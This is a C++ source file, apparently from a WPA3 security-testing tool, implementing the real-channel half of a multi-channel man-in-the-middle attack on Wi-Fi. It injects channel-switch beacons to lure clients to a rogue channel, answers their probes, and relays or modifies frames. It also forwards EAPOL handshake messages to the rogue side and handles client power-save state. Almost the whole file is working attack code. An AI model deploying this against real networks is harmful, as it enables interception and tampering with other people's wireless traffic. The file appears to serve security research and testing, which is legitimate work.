#include <chrono>
#include <tins/tins.h>
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester{
using namespace std;
using namespace chrono;
using namespace Tins;

bool McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
	if(dot11.find_pdu<Dot11ProbeRequest>()){
		probe_resp->addr1(addr2);
		RadioTap rt;
		rt.inner_pdu(probe_resp->clone());
		send_to_real(rt);
		display_traffic(dot11, "Real channel", " -- Replied");
		return true;
	}
	if(dot11.find_pdu<Dot11ProbeResponse>()){
		if(addr2 == ap_mac) display_traffic(dot11, "Real channel");
		return true;
	}
	return false;
}

bool McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, const Dot11 &dot11){
	if(addr1 != ap_mac) return false;
	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
		const auto client_addr = auth->addr2();
		display_traffic(dot11, "Real channel");

		if(client_state.get_mac() == client_addr)
			log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
				client_addr);

		send_csa_beacon(1, client_addr);
		send_csa_beacon();

		client_state.update_state(ClientState::Sent_to_rogue);
		return true;
	}
	return false;
}

bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const std::vector<unsigned char> &raw,
								const Dot11 &dot11
) const{
	if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return false;
	if(dot11.wep()){
		if(addr2 == ap_mac){
			display_traffic(dot11, "Real channel", " -- MitM");
			send_to_rogue(raw);
			return true;
		}
	}

	const auto serialization = const_cast<Dot11&>(dot11).serialize();
	if(serialization.size() < 25) return false;
	const uint8_t category = serialization[24];

	if(category == 0){
		log(LogLevel::DEBUG, "Dropping Action frame category=0 (Spectrum Management)");
		return true;
	}

	const HWAddress<6> src(serialization.data() + 10);
	const HWAddress<6> dst(serialization.data() + 4);

	if(src == ap_mac && client_state.get_mac() == dst){
		log(LogLevel::DEBUG, "Real channel: Action(cat={}) → rogue channel", category);
		send_to_rogue(pdu);
		return true;
	}
	return false;
}

bool McMitm::handle_eapol_real(const HWAddress<6> addr2, PDU &pdu) const{
	if(addr2 == ap_mac){
		// EAPOL od AP → forward na rogue channel
		if(is_eapol(pdu)){
			int eapol_msg = get_eapol_msg_num(pdu);
			log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
			if(eapol_msg == 1 || eapol_msg == 3) send_to_rogue(pdu);
			return true;
		}
	}
	return false;
}

void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11, const HWAddress<6> &addr1){
	// Beacon from real AP — update timestamp
	if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
		const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
		if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel.ch_num) last_real_beacon =
				steady_clock::now();
		return;
	}

	const bool might_forward = client_state.get_mac() == addr1 && client_state.should_forward(*pdu);

	//print
	if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
	} else if(client_state.get_mac() == dot11.addr1()){
		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
	} else if(might_forward){
		display_traffic(dot11, "Real channel", " -- MitM ap");
	}

	// Forward na rogue channel
	if(might_forward){
		client_state.modify_packet(*pdu);
		send_to_rogue(*pdu);
	}

	if(dot11.find_pdu<Dot11Deauthentication>()) client_state.update_state(ClientState::Target);
}

void McMitm::power_mgmt_response(HWAddress<6> addr2, const Dot11 &dot11) const{
	if(dot11.addr1() == ap_mac){
		// Sleep mode detection
		if(dot11.power_mgmt() && client_state.get_mac() == addr2){
			log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2);
			Dot11Data null_frame{};
			null_frame.type(Dot11::DATA);
			null_frame.subtype(Dot11::DATA_NULL);
			null_frame.addr1(ap_mac);
			null_frame.addr2(addr2);
			null_frame.addr3(ap_mac);
			sock_real->send(null_frame, netconfig.real_channel);
		}
	}
}

void McMitm::send_to_real(PDU &pdu) const{ sock_real->send(pdu, netconfig.real_channel); }

void McMitm::send_to_real(const std::vector<uint8_t> &raw) const{
	sock_real->send(raw, netconfig.real_channel);
}

//void McMitm::send_to_real(const std::vector<uint8_t> &raw) const { sock_real->send(, netconfig.real_channel); }
void McMitm::send_to_rogue(PDU &pdu) const{ sock_rogue->send(pdu, netconfig.rogue_channel); }

void McMitm::send_to_rogue(const std::vector<uint8_t> &raw) const{
	sock_rogue->send(raw, netconfig.rogue_channel);
}

void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
		log(LogLevel::DEBUG, "Unknown frame type");
		return;
	}

	power_mgmt_response(addr2, *dot11);

	if(handle_probe_real(addr2, *dot11)) return;
	//TODO if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
	if(handle_eapol_real(addr1, *dot11)) return;
	if(handle_auth_from_client_real(addr1, *dot11)) return;

	if(dot11->addr1() == ap_mac){
		if(client_state.get_mac() == addr2) display_traffic(*dot11, "Real channel");
		// STA -> AP
		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) client_state.update_state(
			ClientState::Target);
	} else if(addr2 == ap_mac){ // AP -> STA
		//TODO FIXME refactirion
		handle_from_ap_real(pdu, *dot11, addr1);
	} else if(client_state.get_mac() == dot11->addr1() || client_state.get_mac() == addr2){
		display_traffic(*dot11, "Real channel", "_");
	}
}
}